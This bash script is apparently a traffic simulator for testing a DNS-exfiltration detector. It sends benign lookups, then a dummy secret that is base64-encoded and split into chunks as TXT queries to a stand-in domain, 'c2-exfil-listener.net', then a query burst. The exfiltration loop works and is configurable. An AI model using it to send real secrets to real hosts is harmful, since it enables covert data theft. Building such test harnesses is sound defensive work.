#!/usr/bin/env bash
# ==============================================================================
# DNS-ExfilWatch - Attack Simulator (simulate_attack.sh)
# Author: Senior Cyber Security Engineer & Systems Software Developer
# Platform: Kali Linux / Linux
#
# Methodology:
#   Constructs and dispatches real DNS queries over UDP port 53 simulating:
#   1. Benign Normal Lookups (google.com, github.com)
#   2. High-Entropy Base64 Chunked Exfiltration (sq01-WW91cl...c2-exfil-listener.net)
#   3. High-Velocity Query Bursts
# ==============================================================================

set -o pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PYTHON_SCRIPT="$SCRIPT_DIR/simulate_attack.py"

# If Python simulator is available, dispatch via Python engine for 100% socket reliability
if [ -f "$PYTHON_SCRIPT" ] && command -v python3 &> /dev/null; then
    exec python3 "$PYTHON_SCRIPT" "$@"
fi

# Fallback Pure Bash / dig Engine
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PURPLE="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
BOLD="\033[1m"
RESET="\033[0m"

DNS_SERVER="127.0.0.1"
DNS_PORT="53"
EXFIL_DOMAIN="c2-exfil-listener.net"
RECORD_TYPE="TXT"
DELAY_BETWEEN_CHUNKS="0.20"
CHUNK_SIZE=36
MODE="all"

while getopts "s:p:d:t:c:w:m:h" opt; do
    case "$opt" in
        s) DNS_SERVER="$OPTARG" ;;
        p) DNS_PORT="$OPTARG" ;;
        d) EXFIL_DOMAIN="$OPTARG" ;;
        t) RECORD_TYPE="$OPTARG" ;;
        c) CHUNK_SIZE="$OPTARG" ;;
        w) DELAY_BETWEEN_CHUNKS="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        h|*) 
            echo "Usage: $0 [-s server] [-p port] [-d domain] [-t type] [-m all|benign|exfil|burst]"
            exit 1
            ;;
    esac
done

if ! command -v dig &> /dev/null && ! command -v nslookup &> /dev/null; then
    echo -e "${RED}[!] Error: dig, nslookup, and python3 were not found.${RESET}"
    exit 1
fi

send_query() {
    local domain="$1"
    local rtype="$2"
    if command -v dig &> /dev/null; then
        dig @"$DNS_SERVER" -p "$DNS_PORT" "$domain" "$rtype" +time=1 +tries=1 +short > /dev/null 2>&1
    else
        nslookup -port="$DNS_PORT" -type="$rtype" "$domain" "$DNS_SERVER" > /dev/null 2>&1
    fi
}

echo -e "${CYAN}=== DNS-ExfilWatch Bash Attack Simulator ===${RESET}"
echo -e "Target: ${GREEN}${DNS_SERVER}:${DNS_PORT}${RESET} | Mode: ${YELLOW}${MODE}${RESET}\n"

if [ "$MODE" = "all" ] || [ "$MODE" = "benign" ]; then
    echo -e "${BLUE}[*] Stage 1: Benign Control Queries...${RESET}"
    for d in "www.google.com" "api.github.com" "en.wikipedia.org"; do
        echo -e "  [+] Query: $d (A) -> Sent"
        send_query "$d" "A"
        sleep 0.2
    done
    echo ""
fi

if [ "$MODE" = "all" ] || [ "$MODE" = "exfil" ]; then
    echo -e "${RED}[*] Stage 2: DNS Tunneling Exfiltration Attack...${RESET}"
    payload="SECRET_TOKEN_SAMPLE_API_KEY_938471928471829471_CREDENTIALS_HASH_EXFIL_DEMO"
    encoded=$(echo -n "$payload" | base64 | tr -d '\n\r=' | tr '+' '-')
    len=${#encoded}
    offset=0
    seq=1

    while [ $offset -lt $len ]; do
        chunk="${encoded:$offset:$CHUNK_SIZE}"
        fqdn="sq${seq}-${chunk}.${EXFIL_DOMAIN}"
        echo -e "  [!] Chunk #${seq}: ${YELLOW}${fqdn:0:45}...${RESET} -> Sent"
        send_query "$fqdn" "$RECORD_TYPE"
        offset=$((offset + CHUNK_SIZE))
        seq=$((seq + 1))
        sleep "$DELAY_BETWEEN_CHUNKS"
    done
    echo ""
fi

if [ "$MODE" = "all" ] || [ "$MODE" = "burst" ]; then
    echo -e "${PURPLE}[*] Stage 3: Query Burst...${RESET}"
    for i in {1..12}; do
        send_query "burst${i}-test.${EXFIL_DOMAIN}" "TXT"
        sleep 0.05
    done
    echo -e "  [+] Sent 12 rapid queries.\n"
fi

echo -e "${GREEN}[✔] Simulation Finished. Check DNS-ExfilWatch Dashboard!${RESET}\n"
